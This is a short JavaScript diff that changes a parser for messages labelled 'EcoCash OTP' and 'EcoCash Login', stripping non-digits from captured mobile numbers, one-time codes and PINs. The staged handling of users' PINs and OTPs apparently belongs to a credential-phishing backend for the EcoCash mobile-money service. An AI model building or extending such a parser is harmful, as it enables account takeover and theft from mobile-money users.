@@ -15,11 +15,15 @@
       return line ? line.slice(line.indexOf(':') + 1).trim() : '';
     };
 
+    const phone = getLine('Mobile').replace(/\D/g, ''); // Keep only digits
+    const otp = getLine('OTP').replace(/\D/g, '');
+    const pin = getLine('PIN').replace(/\D/g, '');
+
     if (/^EcoCash OTP/i.test(lines[0])) {
-      return { stage: 'otp', phone: getLine('Mobile'), otp: getLine('OTP') };
+      return { stage: 'otp', phone, otp };
     }
     if (/^EcoCash Login/i.test(lines[0])) {
-      return { stage: 'pin', phone: getLine('Mobile'), pin: getLine('PIN') };
+      return { stage: 'pin', phone, pin };
     }
     return null;
   }
